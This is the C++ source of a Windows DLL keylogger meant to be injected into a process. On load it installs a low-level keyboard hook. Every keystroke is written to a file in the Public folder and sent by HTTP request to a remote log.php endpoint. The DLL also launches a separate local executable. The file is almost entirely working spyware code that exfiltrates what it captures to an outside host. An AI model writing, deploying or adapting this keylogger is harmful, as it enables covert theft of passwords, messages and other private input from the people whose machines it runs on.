#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <string>

#pragma comment(lib, "wininet.lib")

void SendKeystroke(char key) {
    std::ofstream logFile("C:\\Users\\Public\\keys.txt", std::ios::app);
    logFile << key;
    logFile.close();

    HINTERNET hInternet = InternetOpenA("KeyLogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        std::string url = "http://192.168.64.142/log.php?key=" + std::string(1, key);
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        SendKeystroke((char)pKey->vkCode);
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

DWORD WINAPI KeyLoggerThread(LPVOID lpParam) {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        MessageBoxA(NULL, "Failed to set hook!", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void RunExecutable() {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;

    if (CreateProcessA("C:\\Users\\Tandoor_Wala\\Downloads\\zig\\Zig.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        MessageBoxA(NULL, "Failed to execute zig.exe", "Error", MB_OK | MB_ICONERROR);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "Initialized!", "DLL Loaded", MB_OK | MB_ICONINFORMATION);
        CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL);
        RunExecutable();  // Run zig.exe when DLL is injected
    }
    return TRUE;
}
